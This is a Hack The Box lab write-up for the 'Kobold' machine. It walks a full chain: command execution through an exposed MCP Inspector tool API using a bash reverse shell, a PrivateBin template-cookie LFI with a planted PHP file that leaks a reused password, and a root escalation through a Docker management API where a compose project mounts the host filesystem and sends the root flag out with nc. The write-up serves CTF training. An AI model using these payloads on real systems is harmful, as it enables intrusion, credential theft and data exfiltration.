# HTB Kobold — Full Writeup

**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Linux

---

## Overview

Kobold is an easy Linux machine that highlights modern supply chain and AI integration vulnerabilities. The initial foothold involves an unauthenticated RCE via the MCPJam Inspector API, which exposes Model Context Protocol (MCP) server tools. After gaining access as `ben`, we abuse a local file inclusion (LFI) vulnerability in PrivateBin (running within a Docker container) to leak credentials for the Arcane Docker management platform. Privilege escalation to `root` is achieved by authenticating to the Arcane API, creating a malicious Docker Compose project that mounts the host root file system, and overriding the entrypoint to exfiltrate the root flag.

**Full chain:**
```
MCPJam Inspector API RCE (ben)
  -> PrivateBin LFI to leak Arcane credentials (arcane admin)
    -> Arcane Docker management platform malicious Compose project (root)
```

---

## Reconnaissance

### Open Ports

```bash
nmap -p- -sC -sV 10.129.12.121
```

* **22/tcp**: SSH (OpenSSH 9.6p1 Ubuntu)
* **80/tcp**: HTTP (nginx 1.24.0, redirects to https)
* **443/tcp**: HTTPS (nginx 1.24.0, wildcard cert `*.kobold.htb`)
* **3552/tcp**: Arcane API (Docker management platform)

Adding the discovered hostnames to `/etc/hosts`:
```bash
echo "10.129.12.121 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### MCPJam Inspector API RCE

Visiting `https://mcp.kobold.htb` reveals an instance of MCPJam Inspector. We can query the API to list connected Model Context Protocol (MCP) servers:

```bash
curl -sk https://mcp.kobold.htb/api/mcp/servers
```

This reveals connected MCP servers such as `shell1` and `rce3` which expose an `exec` tool. The tool can be invoked by sending a JSON payload via POST to the `/api/mcp/tools/execute` endpoint. The vulnerability lies in the fact that we can execute arbitrary shell commands via the `cmd` parameter.

*Note: The correct JSON key is `parameters`, not `args` or `arguments`.*

We can create a JSON file `payload.json` containing our reverse shell:
```json
{
  "serverId": "shell1",
  "toolName": "exec",
  "parameters": {
    "cmd": "bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1\""
  }
}
```

Triggering the reverse shell:
```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/tools/execute -H "Content-Type: application/json" -d @payload.json
```

We catch the shell as the user `ben` and grab the user flag.

---

## Privilege Escalation

### Enumeration as Ben

Reviewing the environment as `ben`:
* `ben` is in the `operator` group, but not the `docker` group.
* `alice` is in the `docker` group.
* `/privatebin-data/` is writable by the `operator` group.
* Arcane API is running locally on port `3552` as `root` (PID 1515).
* A Docker container running PrivateBin is active.

Nginx configuration files reveal:
* `bin.kobold.htb` proxies to `127.0.0.1:8080`, which maps to the PrivateBin container.

### PrivateBin LFI to Leak Arcane Credentials

The PrivateBin instance (version 2.0.2) with `templateselection=true` is vulnerable to LFI via the `template` cookie. The template value is relative to the `tpl/` directory inside the container.

Since `/privatebin-data/data/` on the host is writable by `ben` (via the `operator` group) and is mounted to `/srv/data/` inside the PrivateBin container, we can write a PHP file to the host directory and include it via the LFI.

Writing our payload to read the configuration file:
```bash
echo "<?php system('cat /srv/cfg/conf.php'); ?>" > /privatebin-data/data/exploit.php
```

Triggering the LFI to execute our payload:
```bash
curl -s --cookie 'template=../data/exploit' http://172.17.0.2:8080/
```

*(Note: The internal container IP is used, as the LFI didn't trigger properly through the external proxy. Additionally, PHP files are cached, so a new filename should be used for each attempt).*

The leaked `conf.php` reveals the MySQL credentials:
```ini
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
```

### Abusing Arcane API for Root

The Arcane management platform is accessible locally and remotely on port 3552. We can attempt to login using the default `arcane` username and the reused password `ComplexP@sswordAdmin1928`.

```bash
curl -s -X POST http://127.0.0.1:3552/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'
```

This successful login returns a JWT token for the `arcane` admin user. Because Arcane runs as `root` and allows managing Docker Compose projects, we can create a malicious project to mount the host root filesystem and read the root flag.

We prepare a malicious project payload `roothack.json`:
```json
{
  "name": "roothack",
  "composeContent": "services:\n  app:\n    image: privatebin/nginx-fpm-alpine:2.0.2\n    user: root\n    entrypoint: [\"/bin/sh\", \"-c\", \"nc <YOUR_IP> 9001 < /mnt/root/root.txt\"]\n    volumes:\n      - /:/mnt\n"
}
```
*(We use the locally available `privatebin` image since the target doesn't have internet access to pull new images from Docker Hub).*

Create the project:
```bash
TOKEN="<JWT_TOKEN>"
curl -sk -X POST http://10.129.12.121:3552/api/environments/0/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @roothack.json
```
The response will include the `projectId`.

Start a netcat listener locally:
```bash
nc -lvnp 9001
```

Deploy the project to trigger the payload:
```bash
curl -sk -X POST http://10.129.12.121:3552/api/environments/0/projects/<PROJECT_ID>/up \
  -H "Authorization: Bearer $TOKEN"
```

The container starts, mounts the root filesystem, reads `/mnt/root/root.txt`, and sends the root flag to our listener.

---
